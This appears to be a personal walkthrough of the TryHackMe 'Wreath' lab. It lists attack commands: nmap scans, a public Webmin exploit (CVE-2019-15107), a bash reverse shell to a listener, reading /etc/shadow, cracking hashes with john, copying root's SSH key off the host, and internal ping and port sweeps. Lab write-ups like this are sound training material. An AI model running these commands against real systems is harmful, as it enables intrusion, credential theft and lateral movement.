# Wreath

**Room Link:** [https://tryhackme.com/r/room/wreath](https://tryhackme.com/r/room/wreath)



## Enumeration

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo $VICTIM thomaswreath.thm >> /etc/hosts
```

## Exploitation

**Kali**

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
sudo apt install python3-pip
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -nlvp 4444
```

**Victim**

```
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
cat /etc/shadow
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

No passwords found

**Kali**

```
unshadow passwd shadow > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

**Victim**

```
cd /root/.ssh/
scp id_rsa root@10.50.86.117:/root/
```

**Kali**

```
chmod 600 id_rsa
ssh -i id_rsa root@$VICTIM
```

## Enumeration

(document later in notes, including the info in tryhackme)

**Victim**

```
arp -a 
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /etc/hosts 
cat /etc/resolv.conf
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
nmcli dev show 
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```















































